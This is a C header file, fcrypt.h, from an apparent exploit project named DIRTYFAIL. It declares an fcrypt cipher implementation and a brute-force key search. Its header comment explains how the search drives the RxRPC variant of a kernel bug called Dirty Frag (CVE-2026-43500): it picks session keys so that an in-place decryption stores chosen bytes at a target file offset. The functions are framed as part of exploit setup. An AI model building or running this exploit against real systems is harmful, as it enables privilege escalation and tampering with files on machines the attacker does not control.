/*
 * DIRTYFAIL — fcrypt.h
 *
 * fcrypt is the Andrew File System (AFS) rxkad cipher: 56-bit key,
 * 8-byte block, 16-round Feistel structure with four 256-entry S-boxes.
 * It is *deterministic*, with a public algorithm specification — its
 * key space (2^56) is small enough that targeted decryption can be
 * brute-forced in user space at ~15-20 M ops / second on a single core.
 *
 * That property is what makes the RxRPC variant of Dirty Frag
 * (CVE-2026-43500) practical: the in-place 8-byte STORE is
 * fcrypt_decrypt(C, K), where C is the ciphertext at the target file
 * offset and K is the session key the attacker registers via
 * add_key("rxrpc", ...). For each STORE position we want, we run the
 * fcrypt brute force locally until we find a K such that the resulting
 * 8-byte plaintext matches our predicate (e.g. starts with "::").
 *
 * License: see NOTICE.md. The S-box constants are the rxkad protocol
 * tables (also present in the Linux kernel's crypto/fcrypt.c, GPL-2.0,
 * David Howells / KTH).
 */

#ifndef DIRTYFAIL_FCRYPT_H
#define DIRTYFAIL_FCRYPT_H

#include "common.h"

typedef struct {
    uint32_t round_key[16];   /* big-endian, derived in fcrypt_setkey */
} fcrypt_ctx;

/* Initialize the global S-box tables. Call once before any other fcrypt_*. */
void fcrypt_init(void);

/* Run the kernel test vectors and return true if they match. Use this
 * during exploit setup to fail fast on a broken build. */
bool fcrypt_selftest(void);

/* Derive the 16 round keys from an 8-byte key (only the high 7 bits of
 * each byte are used; bit 0 of each byte is parity in the rxkad token
 * format). */
void fcrypt_setkey(fcrypt_ctx *ctx, const uint8_t key[8]);

/* Decrypt a single 8-byte block. */
void fcrypt_decrypt(const fcrypt_ctx *ctx,
                    uint8_t out[8], const uint8_t in[8]);

/* Brute-force search predicate: given an 8-byte candidate plaintext,
 * return true if it satisfies the constraints we want at this STORE
 * position. */
typedef bool (*fcrypt_pred_fn)(const uint8_t plaintext[8]);

/* Search for an 8-byte key K such that fcrypt_decrypt(C, K) satisfies
 * `predicate`. Returns true and fills K and the resulting plaintext on
 * hit; returns false after `max_iters` non-hits.
 *
 * `seed` selects the search starting point (deterministic via splitmix64);
 * pass time(NULL) for randomness across runs, or a fixed value for
 * reproducibility. `label` is logged on hit/timeout for clarity. */
bool fcrypt_brute_force(const uint8_t ciphertext[8],
                        fcrypt_pred_fn predicate,
                        uint64_t max_iters,
                        uint64_t seed,
                        const char *label,
                        uint8_t key_out[8],
                        uint8_t plaintext_out[8]);

#endif
